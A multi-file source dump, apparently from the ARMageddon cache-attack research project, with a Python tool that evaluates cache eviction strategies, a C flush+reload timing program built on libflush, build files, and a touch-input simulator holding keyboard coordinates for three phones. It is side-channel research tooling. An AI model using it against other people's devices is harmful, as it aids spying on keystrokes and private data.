@click.option('-t', '--threshold', type=int, required=True)
@click.pass_context
def cmd_evaluate_strategy(ctx, logfile, threshold):
    device_configuration = ctx.obj['device-configuration']

    # read log file
    result = evaluate_strategy_logfile(logfile, device_configuration, threshold)

    logger.info("Eviction rate: %f%%", result['rate'])
    logger.info("Average runtime: %f", result['average_runtime'])

@click.command('evaluate_strategies')
@click.argument('logfile-directory', type=click.Path(exists=True), required=True)
@click.option('-t', '--threshold', type=int, required=True)
@click.pass_context
def cmd_evaluate_strategies(ctx, logfile_directory, threshold):
    device_configuration = ctx.obj['device-configuration']

    results = []
    for f in sorted(os.listdir(logfile_directory)):
        if not f.endswith(".log"):
            continue

        logfile = os.path.join(logfile_directory, f)

        # read log file
        result = evaluate_strategy_logfile(logfile, device_configuration, threshold)
        if result is not None:
            results.append(result['raw'])

    df = pd.DataFrame(results, columns=['Strategy', 'Number of addresses', 'Number of accesses in loop', 'Different addresses in loop',
                                          'Step size', 'Mirrored', 'Rate', 'Average runtime'])
    df = df.sort(['Strategy'])

    df.to_csv('strategies.csv')

    conn = sqlite3.connect('strategies.db')
    df.to_sql('strategies', conn)


@click.group()
@click.option('-v', '--verbose', count=True, default=False)
@click.option('-f', '--force', is_flag=True)
@click.option('-c', '--configuration-file', type=click.Path(exists=True), required=True)
@click.option('-x', '--device-configuration-file', type=click.Path(exists=True), required=True)
@click.pass_context
def cli(ctx, verbose, force, configuration_file, device_configuration_file):
    if verbose is True:
        logger.setLevel(logging.DEBUG)

    configuration = parse_configuration(configuration_file)
    if configuration is None:
        ctx.fail('Could not parse configuration file')

    device_configuration = parse_device_configuration(device_configuration_file)
    if device_configuration is None:
        ctx.fail('Could not parse device configuration file')

    ctx.obj['configuration'] = configuration
    ctx.obj['device-configuration'] = device_configuration
    ctx.obj['force'] = force

cli.add_command(cmd_run_strategy)
cli.add_command(cmd_run_strategies)
cli.add_command(cmd_evaluate_strategy)
cli.add_command(cmd_evaluate_strategies)


def main():
    cli(obj={})

if __name__ == '__main__':
    main()

```

`eviction_strategy_evaluator/eviction_strategy_evaluator/source/Makefile`:

```
# See LICENSE file for license and copyright information

include ${LIBFLUSH_SOURCE}/config.mk
include ${LIBFLUSH_SOURCE}/common.mk
include ${LIBFLUSH_SOURCE}/colors.mk

PROJECT = executable
SOURCE  = $(wildcard *.c)
OBJECTS = $(addprefix ${BUILDDIR_RELEASE}/,${SOURCE:.c=.o})
OBJECTS_DEBUG = $(addprefix ${BUILDDIR_DEBUG}/,${SOURCE:.c=.o})

INCS += -I${LIBFLUSH_INC}

LIBFLUSH_RELEASE=${LIBFLUSH_BUILDDIR}/release/libflush.a
LIBFLUSH_DEBUG=${LIBFLUSH_BUILDDIR}/debug/libflush.a

ifeq "${ARCH}" "x86"
	LDFLAGS += -pthread
endif

ifeq "${ARCH}" "armv7"
	include ${LIBFLUSH_SOURCE}/config-arm.mk
	LDFLAGS += -pie
endif

ifeq "${ARCH}" "armv8"
	include ${LIBFLUSH_SOURCE}/config-arm64.mk
	LDFLAGS += -pie
endif

all: options ${PROJECT}

options:
	${ECHO} ${PROJECT} build options:
	${ECHO} "CFLAGS  = ${CFLAGS}"
	${ECHO} "LDFLAGS = ${LDFLAGS}"
	${ECHO} "LIBS    = ${LIBS}"
	${ECHO} "CC      = ${CC}"

# release build

${OBJECTS}: ${LIBFLUSH_SOURCE}/config.mk

${BUILDDIR_RELEASE}/%.o: %.c
	$(call colorecho,CC,$<)
	@mkdir -p ${DEPENDDIR}/$(dir $(abspath $@))
	@mkdir -p $(dir $(abspath $@))
	$(QUIET)${CC} -c ${CPPFLAGS} ${CFLAGS} -o $@ $< -MMD -MF ${DEPENDDIR}/$(abspath $@).dep

${BUILDDIR_RELEASE}/${BINDIR}/${PROJECT}: ${OBJECTS}
	$(call colorecho,CC,$@)
	@mkdir -p ${BUILDDIR_RELEASE}/${BINDIR}
	$(QUIET)${CC} ${SFLAGS} ${LDFLAGS} \
		-o ${BUILDDIR_RELEASE}/${BINDIR}/${PROJECT} ${OBJECTS} ${LIBS} ${LIBFLUSH_RELEASE}

${PROJECT}: ${BUILDDIR_RELEASE}/${BINDIR}/${PROJECT}

run: ${PROJECT}
		${BUILDDIR_RELEASE}/${BINDIR}/${PROJECT}

# debug build

${OBJECTS_DEBUG}: ${LIBFLUSH_SOURCE}/config.mk

${BUILDDIR_DEBUG}/%.o: %.c
	$(call colorecho,CC,$<)
	@mkdir -p ${DEPENDDIR}/$(dir $(abspath $@))
	@mkdir -p $(dir $(abspath $@))
	$(QUIET)${CC} -c ${CPPFLAGS} ${CFLAGS} -o $@ $< -MMD -MF ${DEPENDDIR}/$(abspath $@).dep

${BUILDDIR_DEBUG}/${BINDIR}/${PROJECT}: ${OBJECTS_DEBUG} dependencies-debug
	$(call colorecho,CC,$@)
	@mkdir -p ${BUILDDIR_DEBUG}/${BINDIR}
	$(QUIET)${CC} ${SFLAGS} ${LDFLAGS} \
		-o ${BUILDDIR_DEBUG}/${BINDIR}/${PROJECT} ${OBJECTS_DEBUG} ${LIBS} ${LIBFLUSH_DEBUG}

debug: ${BUILDDIR_DEBUG}/${BINDIR}/${PROJECT}

run-debug: debug
		${BUILDDIR_DEBUG}/${BINDIR}/${PROJECT}

dependencies-debug:
	$(QUIET)${MAKE} WITH_LIBFIU=1 -C .. debug

# debugging

gdb: debug
	$(QUIET)${GDB} ${BUILDDIR_DEBUG}/${BINDIR}/${PROJECT}

# clean

clean:
	$(QUIET)rm -rf ${PROJECT}.so ${OBJECTS} .depend ${PROJECT}.gcda ${PROJECT}.gcno

.PHONY: all options clean debug run dependencies dependencies-debug gdb

-include $(wildcard .depend/*.dep)

```

`eviction_strategy_evaluator/eviction_strategy_evaluator/source/main.c`:

```c
 /* See LICENSE file for license and copyright information */

#define _GNU_SOURCE

#include <stdlib.h>
#include <math.h>
#include <stdio.h>
#include <sched.h>
#include <unistd.h>
#include <inttypes.h>
#include <getopt.h>
#include <sched.h>

#include <libflush/libflush.h>

#define NUMBER_OF_RUNS (1ull*1000ull*1000ull)
#define BATCH_SIZE 5000
#define BIND_TO_CPU 1

#define MIN(a, b) ((a) > (b)) ? (b) : (a)

static void
print_help(char* argv[]) {
  fprintf(stdout, "Usage: %s [OPTIONS]\n", argv[0]);
  fprintf(stdout, "\t-c, -cpu <value>\t Bind to cpu\n");
  fprintf(stdout, "\t-t, -thread-cpu <value>\t Bind thread to cpu (only for thread counter)\n");
  fprintf(stdout, "\t-n, -number-of-measurements <value>\t Number of measurements\n");
  fprintf(stdout, "\t-b, -batch-size <value>\t Batch size\n");
  fprintf(stdout, "\t-h, -help\t Help page\n");
}

int
main(int argc, char* argv[])
{
  /* Define parameters */
  size_t cpu = BIND_TO_CPU;
  size_t thread_cpu = BIND_TO_CPU + 1;
  FILE* logfile = NULL;
  uint64_t number_of_runs = NUMBER_OF_RUNS;
  uint64_t batch_size = BATCH_SIZE;

  /* Parse arguments */
  static const char* short_options = "c:t:n:b:h";
  static struct option long_options[] = {
    {"cpu",             required_argument, NULL, 'c'},
    {"thread-cpu",      required_argument, NULL, 't'},
    {"number-of-runs",  required_argument, NULL, 'n'},
    {"batch-size",      required_argument, NULL, 'b'},
    {"help",            no_argument, NULL, 'h'},
    { NULL,             0, NULL, 0}
  };

  size_t number_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);

  int c;
  while ((c = getopt_long(argc, argv, short_options, long_options, NULL)) != -1) {
    switch (c) {
      case 'c':
        cpu = atoi(optarg);
        if (cpu >= number_of_cpus) {
          fprintf(stderr, "Error: CPU %zu is not available.\n", cpu);
          return -1;
        }
        break;
      case 't':
        thread_cpu = atoi(optarg);
        if (thread_cpu >= number_of_cpus) {
          fprintf(stderr, "Error: CPU %zu is not available.\n", thread_cpu);
          return -1;
        }
        break;
      case 'n':
        number_of_runs = atoi(optarg);
        break;
      case 'b':
        batch_size = atoi(optarg);
        break;
      case 'h':
        print_help(argv);
        return 0;
      case ':':
        fprintf(stderr, "Error: option `-%c' requires an argument\n", optopt);
        break;
      case '?':
      default:
        fprintf(stderr, "Error: Invalid option '-%c'\n", optopt);
        return -1;
    }
  }

  if (optind >= argc) {
    fprintf(stderr, "Error: No logfile passed\n");
    return 0;
  }

  logfile = fopen(argv[optind], "w+");
  if (logfile == NULL) {
    fprintf(stderr, "Error: Could not open logfile '%s'\n", argv[optind]);
    return -1;
  }

  /* Bind to CPU */
  cpu = cpu % number_of_cpus;
  thread_cpu = thread_cpu % number_of_cpus;

  if (libflush_bind_to_cpu(cpu) == false) {
    fprintf(stderr, "Could not bind to CPU: %zu\n", cpu);
  }

  char buffer[4096] = {0};
  void* address = (void*) ((size_t) &buffer[1024] & ~(0x3F));

  /* Initialize libflush */
  libflush_session_args_t args;
  args.bind_to_cpu = thread_cpu;
  libflush_session_t* libflush_session;
  if (libflush_init(&libflush_session, &args) == false) {
    fprintf(stderr, "Error: Could not initialize libflush.\n");
    return -1;
  }

  // Initialize results
  uint64_t* miss_measurements = calloc(number_of_runs, sizeof(uint64_t));
  if (miss_measurements == NULL) {
    fprintf(stderr, "Error: Out of memory\n");
    return -1;
  }

  uint64_t* execution_measurements = calloc(number_of_runs, sizeof(uint64_t));
  if (execution_measurements == NULL) {
    fprintf(stderr, "Error: Out of memory\n");
    return -1;
  }

  uint64_t number_of_batches = ceil(number_of_runs / batch_size);

  uint64_t* execution_batch_measurements = calloc(number_of_batches, sizeof(uint64_t));
  if (execution_batch_measurements == NULL) {
    fprintf(stderr, "Error: Out of memory\n");
    return -1;
  }

  libflush_flush(libflush_session, address);

  // Measure time it takes to access something from the memory
  for (unsigned int i = 0; i < number_of_runs; i++) {
      uint64_t time = libflush_reload_address_and_flush(libflush_session, address);
      miss_measurements[i] = time;
      sched_yield();
  }

  // Miss time
  libflush_reset_timing(libflush_session);
  for (unsigned int i = 0; i < number_of_runs; i++) {
      uint64_t begin = libflush_get_timing(libflush_session);
      libflush_flush(libflush_session, address);
      libflush_access_memory(address);
      uint64_t end = libflush_get_timing(libflush_session);
      execution_measurements[i] = end - begin;
      sched_yield();
  }

  for (unsigned int b = 0; b < number_of_batches; b++) {
    libflush_reset_timing(libflush_session);

    uint64_t begin = libflush_get_timing(libflush_session);
    for (unsigned int i = 0; i < batch_size; i++) {
      libflush_access_memory(address);
      libflush_flush(libflush_session, address);
    }
    uint64_t end = libflush_get_timing(libflush_session);
    execution_batch_measurements[b] = end - begin;
    sched_yield();
  }

  fprintf(logfile, "Miss,Runtime,RuntimeBatch\n");
  for (unsigned int i = 0; i < number_of_runs; i++) {
    fprintf(logfile, "%" PRIu64 ",%" PRIu64 ",",
        miss_measurements[i], execution_measurements[i]);

    if (i < number_of_batches) {
      fprintf(logfile, "%" PRIu64 "", execution_batch_measurements[i]);
    }

    fprintf(logfile, "\n");
  }

  fflush(logfile);
  fclose(logfile);

  free(miss_measurements);
  free(execution_measurements);

  /* Terminate libflush */
  libflush_terminate(libflush_session);

  return 0;
}

```

`eviction_strategy_evaluator/eviction_strategy_evaluator/strategy.py`:

```py
import os
import math
from jinja2 import Environment, FileSystemLoader

from .build import Builder
from .executor import Executor


def render_template(template_file, context):
    path = os.path.dirname(os.path.abspath(__file__))
    environment = Environment(
        autoescape=False,
        loader=FileSystemLoader(os.path.join(path, 'templates')),
        trim_blocks=False)

    return environment.get_template(template_file).render(context)


def generate_source(template_file, source_file, **context):
    code = render_template(template_file, context)

    # Save source file
    with open(source_file, 'w') as f:
        f.write(code)


class Strategy(object):
    def __init__(self, configuration, device_configuration, eviction_counter,
                 number_of_accesses_in_loop, different_addresses_in_loop,
                 step_size, mirroring):
        self.device_configuration = device_configuration
        self.eviction_counter = eviction_counter
        self.number_of_accesses_in_loop = number_of_accesses_in_loop
        self.different_addresses_in_loop = different_addresses_in_loop
        self.step_size = step_size
        self.mirroring = mirroring
        self.number_of_addresses = self.eviction_counter + self.different_addresses_in_loop - 1
        self.configuration = configuration
        self.builder = Builder(self.configuration, self)
        self.executor = Executor(self.configuration, self, self.builder)

    def build(self, force):
        return self.builder.build(force)

    def run(self, number_of_measurements, force):
        return self.executor.run(number_of_measurements, force)

    def get_logfile_name(self):
        device_codename = self.device_configuration['device']['codename']
        log_dir = os.path.join(self.configuration['logs']['directory'], device_codename)
        local_logfile = os.path.join(log_dir, self.get_name() + ".log")
        return local_logfile

    def save_strategy_to_file(self, source_file):
        generate_source(
            'strategy.jinja2',
            source_file,
            number_of_sets=self.device_configuration['cache']['number-of-sets'],
            line_length=self.device_configuration['cache']['line-length'],
            line_length_log2=int(math.log(
                self.device_configuration['cache']['line-length'],
                2)),
            eviction_counter=self.eviction_counter,
            number_of_accesses_in_loop=self.number_of_accesses_in_loop,
            different_addresses_in_loop=self.different_addresses_in_loop,
            step_size=self.step_size)

    def get_name(self):
        name = "%d-%d-%d-%d-%s" % (self.number_of_addresses,
                                self.number_of_accesses_in_loop,
                                self.different_addresses_in_loop,
                                self.step_size,
                                "M" if self.mirroring else "m")
        return name

```

`eviction_strategy_evaluator/eviction_strategy_evaluator/templates/strategy.jinja2`:

```jinja2
#define NUMBER_OF_SETS {{ number_of_sets }}
#define LINE_LENGTH {{ line_length }}
#define LINE_LENGTH_LOG2 {{ line_length_log2 }}
#define ES_EVICTION_COUNTER {{ eviction_counter }}
#define ES_NUMBER_OF_ACCESSES_IN_LOOP {{ number_of_accesses_in_loop }}
#define ES_DIFFERENT_ADDRESSES_IN_LOOP {{ different_addresses_in_loop }}
#define ES_STEP_SIZE {{ step_size }}

```

`eviction_strategy_evaluator/eviction_strategy_evaluator/utils.py`:

```py
import logging
import subprocess
import io

logger = logging.getLogger('default')


def execute_command(command):
    proc = subprocess.Popen(command, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    debug = True
    if debug is True:
        for l in io.TextIOWrapper(proc.stdout, encoding='utf-8'):
            print(l, end="")
        for l in io.TextIOWrapper(proc.stderr, encoding='utf-8'):
            print(l, end="")
    else:
        proc.communicate()

```

`eviction_strategy_evaluator/setup.cfg`:

```cfg
[egg_info]
tag_build = dev

[upload]
dry-run = 1

```

`eviction_strategy_evaluator/setup.py`:

```py
from codecs import open as codecs_open
from setuptools import setup, find_packages


# Get the long description from the relevant file
with codecs_open('README.md', encoding='utf-8') as f:
    long_description = f.read()


setup(name='eviction_strategy_evaluator',
      version='0.0.1',
      description=u"Eviction strategy evaluator for libflush",
      long_description=long_description,
      classifiers=[],
      keywords='',
      author=u"Moritz Lipp",
      author_email='mail@mlq.me',
      url='https://github.com/iaik/armageddon',
      license='zlib',
      packages=find_packages(exclude=['ez_setup', 'examples', 'tests']),
      package_data={"eviction_strategy_evaluator": [
          "templates/strategy.jinja2",
          "source/Makefile",
          "source/main.c"
         ]},
      include_package_data=True,
      zip_safe=False,
      install_requires=[
          'click',
          'PyYAML',
          'pandas'
      ],
      extras_require={
          'test': ['pytest'],
      },
      entry_points="""
      [console_scripts]
      eviction_strategy_evaluator=eviction_strategy_evaluator.main:main
      """
      )

```

`input_simulator/Makefile`:

```
# See LICENSE file for license and copyright information

include config.mk
include colors.mk
include common.mk

SOURCE = $(wildcard ${PROJECT}/*.c)

ifneq ($(wildcard ${VALGRIND_SUPPRESSION_FILE}),)
VALGRIND_ARGUMENTS += --suppressions=${VALGRIND_SUPPRESSION_FILE}
endif

OBJECTS       = $(addprefix ${BUILDDIR_RELEASE}/,${SOURCE:.c=.o})
OBJECTS_DEBUG = $(addprefix ${BUILDDIR_DEBUG}/,${SOURCE:.c=.o})

ifeq "${ARCH}" "armv7"
	include config-arm.mk
	CPPFLAGS += -DARM_DEVICE
endif

ifeq "${ARCH}" "armv8"
	include config-arm64.mk
	CPPFLAGS += -D__ARM_ARCH_8A__
endif

ifneq (${DEVICE_CONFIGURATION},0)
CFLAGS += -D${DEVICE_CONFIGURATION}
endif

all: options ${PROJECT}

# pkg-config based version checks
.version-checks/%: config.mk
	$(QUIET)test $($(*)_VERSION_CHECK) -eq 0 || \
		${PKG_CONFIG} --atleast-version $($(*)_MIN_VERSION) $($(*)_PKG_CONFIG_NAME) || ( \
		echo "The minimum required version of $(*) is $($(*)_MIN_VERSION)" && \
		false \
	)
	@mkdir -p .version-checks
	$(QUIET)touch $@

options:
	@echo ${PROJECT} build options:
	@echo "CFLAGS  = ${CFLAGS}"
	@echo "LIBS    = ${LIBS}"
	@echo "DFLAGS  = ${DFLAGS}"
	@echo "CC      = ${CC}"

# release build

${OBJECTS}: config.mk

${BUILDDIR_RELEASE}/%.o: %.c
	$(call colorecho,CC,$<)
	@mkdir -p ${DEPENDDIR}/$(dir $@)
	@mkdir -p $(dir $(abspath $@))
	$(QUIET)${CC} -c ${CPPFLAGS} ${CFLAGS} -o $@ $< -MMD -MF ${DEPENDDIR}/$@.dep

${BUILDDIR_RELEASE}/${BINDIR}/${PROJECT}: ${OBJECTS}
	$(call colorecho,CC,$@)
	@mkdir -p ${BUILDDIR_RELEASE}/${BINDIR}
	$(QUIET)${CC} ${SFLAGS} ${LDFLAGS} \
		-o ${BUILDDIR_RELEASE}/${BINDIR}/${PROJECT} ${OBJECTS} ${LIBS}

${PROJECT}: ${BUILDDIR_RELEASE}/${BINDIR}/${PROJECT}

release: ${PROJECT}

run: release
	$(QUIET)./${BUILDDIR_RELEASE}/${BINDIR}/${PROJECT}

# debug build

${OBJECTS_DEBUG}: config.mk

${BUILDDIR_DEBUG}/%.o: %.c
	$(call colorecho,CC,$<)
	@mkdir -p ${DEPENDDIR}/$(dir $@)
	@mkdir -p $(dir $(abspath $@))
	$(QUIET)${CC} -c ${CPPFLAGS} ${CFLAGS} ${DFLAGS} \
		-o $@ $< -MMD -MF ${DEPENDDIR}/$@.dep

${BUILDDIR_DEBUG}/${BINDIR}/${PROJECT}: ${OBJECTS_DEBUG}
	$(call colorecho,CC,$@)
	@mkdir -p ${BUILDDIR_DEBUG}/${BINDIR}
	$(QUIET)${CC} ${LDFLAGS} \
		-o ${BUILDDIR_DEBUG}/${BINDIR}/${PROJECT} ${OBJECTS_DEBUG} ${LIBS}

debug: ${BUILDDIR_DEBUG}/${BINDIR}/${PROJECT}

run-debug: debug
	$(QUIET)./${BUILDDIR_DEBUG}/${BINDIR}/${PROJECT}

# clean

clean:
	$(QUIET)rm -rf \
		${BUILDDIR} \
		${DEPENDDIR} \
		${TARFILE} \
		${TARDIR} \

valgrind: debug
	 $(QUIET)G_SLICE=always-malloc G_DEBUG=gc-friendly ${VALGRIND} ${VALGRIND_ARGUMENTS} \
		 ${BUILDDIR_DEBUG}/${BINDIR}/${PROJECT}

gdb: debug
	$(QUIET)cgdb ${BUILDDIR_DEBUG}/${BINDIR}/${PROJECT}

dist: clean
	$(QUIET)tar -czf $(TARFILE) --exclude=.gitignore \
		--transform 's,^,${PROJECT}-$(VERSION)/,' \
		`git ls-files`

install: all
	$(call colorecho,INSTALL,"executeable file")
	$(QUIET)mkdir -m 755 -p ${DESTDIR}${PREFIX}/bin
	$(QUIET)install -m 755 ${BUILDDIR_RELEASE}/${BINDIR}/${PROJECT} ${DESTDIR}${PREFIX}/bin

uninstall:
	$(ECHO) removing executable file
	$(call colorecho,UNINSTALL,"executeable")
	$(QUIET)rm -f ${DESTDIR}${PREFIX}/bin/${PROJECT}

DEPENDS = ${DEPENDDIRS:^=${DEPENDDIR}/}$(addprefix ${DEPENDDIR}/,${OBJECTS:.o=.o.dep})
-include ${DEPENDS}

.PHONY: all options clean doc debug valgrind gdb dist install uninstall

```

`input_simulator/README.md`:

```md
# Input Simulator

Input Simulator is a tool that can be used to simulate events like taps on the
touch screen.

It has been used for our [ARMageddon: Cache Attacks on Mobile Devices](https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/lipp) paper by Lipp, Gruss, Spreitzer, Maurice and Mangard that has been published at the Usenix Security Symposium 2016 and presented at [Black Hat Europe 2016](https://www.blackhat.com/eu-16/briefings/schedule/index.html#armageddon-how-your-smartphone-cpu-breaks-software-level-security-and-privacy-4887).

## Table of content

- [Installation](#installation)
    - [Dependencies](#dependencies)
- [Usage](#usage)
- [Customization](#example)
- [License](#license)
- [References](#references)

## Installation

The tool is shipped with a Makefile and can be compiled by running:
```bash
make
```

The tool can be installed on the host system:
```bash
make install
```
### Dependencies

By default it uses the toolchains provided by the Android NDK if built
for _armv7_ or _armv8_.

* [Android NDK](https://developer.android.com/ndk/index.html) - Android Native
    Development Kit (optional, for ARM builds)

## Build Configuration

The build system makes use of several configuration files. The parameters can be adjusted by modifying the files accordingly or by passing them to make (`make ARCH=x86`). The most important properties are the following:

* `ARCH`: Defines the target architecture.
    * _x86_ (default) - Support for _i386_ and _x86_64_
    * _armv7_ - Support for ARMv7
    * _armv8_ - Support for ARMv8
* `DEVICE_CONFIGURATION`: Define which device you are using to enable 
    device specific code.

If the library is build for the ARMv7 or the ARMv8 architecture the build system uses the [config-arm.mk](config-arm.mk) or [config-arm64.mk](config-arm64.mk) configuration file. By default the build system makes use of the toolchains provided by the [Android NDK](https://developer.android.com/ndk/index.html), thus its possible that the installation path of the NDK needs to be modified:

* `ANDROID_NDK_PATH`: Path to the installation of the Android NDK.
    * _/opt/android-ndk_ (default)
* `ANDROID_PLATFORM`: Defines the used Android platform that is used.
    * _android-21_ (default)

If you prefer to use a different toolchain/compiler, feel free to change `CC` and other properties accordingly.

## Usage

```
input-simulator [OPTIONS] <letter>
```

The following options are available:

* **-r, -repititions**

    How often the event should be triggered. -1 means infinite repititions.

* **-d, -delay**

    The delay between each triggered event.

* **-h, -help**

    Show the help information.

## Customization

**This code needs to be customized to suite your needs.** While we provide the mapping
for the keyboards of three devices, they might do not match the keyboard and the
device you use. Thus, you need to modify or extend the source code in
`key-mapping.c` and `simulator.c`.

## License

[Licensed](LICENSE) under the zlib license.

## References

* [1] [ARMageddon: Cache Attacks on Mobile Devices (USENIX Security 2016) - Lipp, Gruss, Spreitzer, Maurice, Mangard](https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/lipp)
* [2] [ARMageddon: How Your Smartphone CPU Breaks Software-Level Security and Privacy (Black Hat Europe 2016) - Lipp, Maurice](https://www.blackhat.com/eu-16/briefings/schedule/index.html#armageddon-how-your-smartphone-cpu-breaks-software-level-security-and-privacy-4887)
* [3] [Cache Template Attacks: Automating Attacks on Inclusive Last-Level Caches (USENIX Security 2015) - Gruss, Spreitzer, Mangard](https://www.usenix.org/node/191011)

```

`input_simulator/colors.mk`:

```mk
# See LICENSE file for license and copyright information

ifeq ($(COLOR),1)
# GCC diagnostics colors
DIAGNOSTICS_COLOR_AVAILABLE ?= $(shell ($(CC) -fdiagnostics-color=always -E - </dev/null >/dev/null 2>/dev/null && echo 1) || echo 0)
ifeq ($(DIAGNOSTICS_COLOR_AVAILABLE),1)
CPPFLAGS     += -fdiagnostics-color=always
endif

# colorful output
TPUT ?= /usr/bin/tput
TPUT_AVAILABLE ?= $(shell ${TPUT} -V 2>/dev/null)

ifdef TPUT_AVAILABLE
COLOR_NORMAL  = `$(TPUT) sgr0`
COLOR_ACTION  = `$(TPUT) bold``$(TPUT) setaf 3`
COLOR_COMMENT = `$(TPUT) bold``$(TPUT) setaf 2`
COLOR_BRACKET = `$(TPUT) setaf 4`
define colorecho
	@echo $(COLOR_BRACKET)" ["$(COLOR_ACTION)$1$(COLOR_BRACKET)"] "$(COLOR_COMMENT)$2$(COLOR_BRACKET) $(COLOR_NORMAL)
endef
else
define colorecho
	@echo " [$1]" $2
endef
endif
else
define colorecho
	@echo " [$1]" $2
endef
endif

```

`input_simulator/common.mk`:

```mk
# See LICENSE file for license and copyright information

ifeq "$(VERBOSE)" "0"
ECHO=@echo
QUIET=@
else
ECHO=@\#
QUIET=
endif

```

`input_simulator/config-arm.mk`:

```mk
# Define Android specific variables
ANDROID_NDK_PATH = /opt/android-ndk
ANDROID_TOOLCHAIN_BIN = ${ANDROID_NDK_PATH}/toolchains/arm-linux-androideabi-4.9/prebuilt/linux-x86_64/bin
ANDROID_SYSROOT = ${ANDROID_NDK_PATH}/platforms/${ANDROID_PLATFORM}/arch-arm

ANDROID_CC = ${ANDROID_TOOLCHAIN_BIN}/arm-linux-androideabi-gcc
ANDROID_CC_FLAGS = --sysroot=${ANDROID_SYSROOT}

ANDROID_INCLUDES = -I ${ANDROID_NDK_PATH}/platforms/${ANDROID_PLATFORM}/arch-arm/usr/include
ANDROID_CFLAGS = ${ANDROID_INCLUDES} -march=armv7-a -fPIE
ANDROID_LDFLAGS = ${ANDROID_INCLUDES} -march=armv7-a -fPIE

CC = ${ANDROID_CC} ${ANDROID_CC_FLAGS}
CFLAGS += ${ANDROID_CFLAGS}
LDFLAGS += -pie

```

`input_simulator/config-arm64.mk`:

```mk
# Define Android specific variables
ANDROID_NDK_PATH = /opt/android-ndk
ANDROID_TOOLCHAIN_BIN = ${ANDROID_NDK_PATH}/toolchains/aarch64-linux-android-4.9/prebuilt/linux-x86_64/bin
ANDROID_SYSROOT = ${ANDROID_NDK_PATH}/platforms/${ANDROID_PLATFORM}/arch-arm64

ANDROID_CC = ${ANDROID_TOOLCHAIN_BIN}/aarch64-linux-android-gcc
ANDROID_CC_FLAGS = --sysroot=${ANDROID_SYSROOT}

ANDROID_INCLUDES = -I ${ANDROID_NDK_PATH}/platforms/${ANDROID_PLATFORM}/arch-arm64/usr/include
ANDROID_CFLAGS = ${ANDROID_INCLUDES} -march=armv8-a -fPIE
ANDROID_LDFLAGS = ${ANDROID_INCLUDES} -march=armv8-a -fPIE

CC = ${ANDROID_CC} ${ANDROID_CC_FLAGS}
CFLAGS += ${ANDROID_CFLAGS} -flto
LDFLAGS += ${ANDROID_LDFLAGS} -pie -flto

```

`input_simulator/config.mk`:

```mk
# See LICENSE file for license and copyright information

# project
PROJECT = input-simulator
VERSION = 0.0.1

# arch
ARCH = x86

# pkg-config binary
PKG_CONFIG ?= pkg-config

# paths
PREFIX ?= /usr
DEPENDDIR ?= .depend
BUILDDIR ?= build/${ARCH}
BUILDDIR_RELEASE ?= ${BUILDDIR}/release
BUILDDIR_DEBUG ?= ${BUILDDIR}/debug
BINDIR ?= bin

# libs
INCS =
LIBS =

# compiler flags
CFLAGS += -std=c11 -pedantic -Wall -Wno-format-zero-length -Wextra -O3 $(INCS)

# debug
DFLAGS ?= -g

# linker flags
LDFLAGS += -rdynamic

# compiler
CC ?= gcc

# strip
SFLAGS ?= -s

# valgrind
VALGRIND = valgrind
VALGRIND_ARGUMENTS = --tool=memcheck --leak-check=yes --leak-resolution=high \
	--show-reachable=yes --log-file=${PROJECT}-valgrind.log
VALGRIND_SUPPRESSION_FILE = ${PROJECT}.suppression

# set to something != 0 if you want verbose build output
VERBOSE ?= 0

# colors
COLOR ?= 1

# dist
TARFILE = ${PROJECT}-${VERSION}.tar.gz
TARDIR = ${PROJECT}-${VERSION}

# android
ANDROID_PLATFORM ?= android-21

# device configuration
DEVICE_CONFIGURATION ?= ZEROFLTE

```

`input_simulator/input-simulator/key-mapping.c`:

```c
#include <stdlib.h>

#include "key-mapping.h"

// Alcatel AOSP
#if defined(ALTO45)
key_mapping_t key_mappings[] = {
  { "a",  60, 660 },
  { "b", 280, 730 },
  { "c", 195, 730 },
  { "d", 140, 660 },
  { "e", 125, 570 },
  { "f", 195, 660 },
  { "g", 235, 660 },
  { "h", 280, 660 },
  { "i", 360, 570 },
  { "j", 330, 660 },
  { "k", 380, 660 },
  { "l", 425, 660 },
  { "m", 380, 730 },
  { "n", 335, 730 },
  { "o", 400, 570 },
  { "p", 455, 570 },
  { "q",  35, 570 },
  { "r", 165, 570 },
  { "s", 100, 660 },
  { "t", 215, 570 },
  { "u", 315, 570 },
  { "v", 235, 730 },
  { "w",  75, 570 },
  { "x", 140, 730 },
  { "y", 265, 570 },
  { "z",  90, 730 },
  { "space",  240, 810 },
  { "enter",  445, 810 },
  { "backspace",  445, 720 },
  { NULL, 0 ,0 }
};
#elif defined(MAKO)
key_mapping_t key_mappings[] = {
  { "a", 75,  920 },
  { "b", 481, 1025 },
  { "c", 328, 1025  },
  { "d", 250, 930 },
  { "e", 172, 829 },
  { "f", 323, 907 },
  { "g", 393, 932 },
  { "h", 474, 942 },
  { "i", 570, 840 },
  { "j", 534, 935 },
  { "k", 625, 932 },
  { "l", 705, 947 },
  { "m", 622, 1045 },
  { "n", 540, 1028 },
  { "o", 668, 825 },
  { "p", 736, 828 },
  { "q", 49,  833 },
  { "r", 307, 827 },
  { "s", 159, 930 },
  { "t", 373, 813 },
  { "u", 502, 844 },
  { "v", 391, 1017 },
  { "w", 111, 835 },
  { "x", 200, 1036 },
  { "y", 427, 824 },
  { "z", 164, 1036 },
  { "space",     386, 1146 },
  { "enter",     714, 1121 },
  { "backspace", 733, 1014 },
  { NULL, 0 ,0 }
};
#elif defined(ZEROFLTE)
key_mapping_t key_mappings[] = {
  { "a", 150,  2030 },
  { "b", 860,  2236 },
  { "c", 565,  2236  },
  { "d", 430,  2030 },
  { "e", 370,  1836 },
  { "f", 575,  2030 },
  { "g", 716,  2030 },
  { "h", 855,  2030 },
  { "i", 1077, 1836 },
  { "j", 997,  2030 },
  { "k", 1138, 2030 },
  { "l", 1282, 2030 },
  { "m", 1130, 2236 },
  { "n", 1005, 2236 },
  { "o", 1211, 1836 },
  { "p", 1330, 1836 },
  { "q", 122,  1836 },
  { "r", 491,  1836 },
  { "s", 298,  2030 },
  { "t", 650,  1836 },
  { "u", 910,  1836 },
  { "v", 730,  2236 },
  { "w", 213,  1836 },
  { "x", 431,  2236 },
  { "y", 768,  1836 },
  { "z", 290,  2236 },
  { "space",     700, 2420 },
  { "enter",     1280, 2420 },
  { "backspace", 1280, 2236 },
  { NULL, 0 ,0 }
};
#else
key_mapping_t key_mappings[] = {
  { NULL, 0, 0 }
};
#endif


